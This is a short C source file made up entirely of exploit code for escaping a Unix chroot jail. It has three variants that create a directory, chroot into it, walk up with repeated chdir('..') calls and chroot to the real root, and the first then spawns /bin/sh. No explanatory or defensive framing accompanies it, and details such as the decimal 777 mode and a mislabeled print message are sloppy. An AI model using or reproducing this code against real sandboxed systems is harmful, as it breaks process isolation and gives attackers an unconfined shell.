
#include <unistd.h> 
#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 
#include <sys/stat.h>
#include <fcntl.h>

int attack_chroot_escape()
{
    printf("chroot escape!\n");
    int fd = open(".", O_DIRECTORY);
    mkdir("fnord", 777);
    chroot("fnord");
    chdir("../../../../../../..");
    chroot(".");
    execve("/bin/sh", NULL, NULL);
}

int attack_chroot_escape2()
{
    printf("chroot escape2!\n");
    chdir("../../../../../../..");
    chroot(".");
}

int attack_chroot_escape3()
{
    printf("chroot escape2!\n");
    mkdir(".42", 0755);
    chroot(".42");
    //fchdir(3); // there is a log file open at fd 3
    chdir("..");
    chroot(".");
}

int main(int argc, char* argv[])
{
    attack_chroot_escape();
}
